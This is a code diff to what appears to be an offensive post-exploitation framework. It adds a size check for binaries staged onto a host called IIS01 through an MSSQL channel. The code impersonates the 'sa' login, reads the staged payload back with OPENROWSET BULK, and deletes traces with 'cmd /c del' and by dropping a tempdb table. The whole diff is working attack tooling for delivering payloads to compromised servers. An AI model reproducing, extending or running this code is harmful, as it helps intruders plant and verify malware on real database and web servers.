@@ -1,5 +1,10 @@
 import os
 
+# controlShell/xp_mssql/ -> ../../payloads/ (same machine as controlServer,
+# so the source payload size is readable locally for the post-stage verify)
+_PAYLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                             "..", "..", "payloads")
+
 
 class StagingMixin:
     """Stage binaries to IIS01 via MSSQL DB channel."""
@@ -80,11 +85,42 @@ class StagingMixin:
             )
         self._exec_q(shell, decode_tsql, timeout_s=timeout_s)
 
+        final_path = out_path if rename else stl_path
+
+        # Size verify: the ADODB.Stream write has no integrity feedback - a
+        # failed/interleaved SaveToFile silently leaves the previous on-disk
+        # file in place. Compare the staged file against the source payload.
+        expected = None
+        try:
+            expected = os.path.getsize(os.path.join(_PAYLOADS_DIR, payload_name))
+        except OSError as e:
+            print(f"[!] xpstage-hex: cannot stat local payload for size verify: {e}")
+        if expected is not None:
+            self._verify_staged_size(shell, final_path, expected)
+
         shell.cmd_exec_raw(f'cmd /c del /f {remote_sql}')
         self._exec_q(shell, "EXECUTE AS LOGIN='sa';"
             "IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
-        final_path = out_path if rename else stl_path
         print(f"[+] xpstage-hex done: {final_path}")
+
+    def _verify_staged_size(self, shell, disk_path: str, expected_bytes: int):
+        """Compare the staged binary's on-disk size with the source payload."""
+        out = self._exec_q(shell,
+            "EXECUTE AS LOGIN='sa';"
+            "SELECT DATALENGTH(BulkColumn) FROM OPENROWSET(BULK "
+            f"'{self._tsql_escape(disk_path)}',SINGLE_BLOB) AS x;"
+        )
+        on_disk = None
+        for line in (out or "").splitlines():
+            s = line.strip()
+            if s.isdigit():
+                on_disk = int(s)
+                break
+        if on_disk == expected_bytes:
+            print(f"[+] size match: {disk_path} ({expected_bytes} bytes)")
+        else:
+            print(f"[!] SIZE MISMATCH: {disk_path} on-disk={on_disk} "
+                  f"expected={expected_bytes} — re-stage (xpstage-hex)")
 
     def _build_decrypt_ps(self, key_b64: str, out_path: str) -> str:
         sqlclient_host = self._host.replace(':', ',')
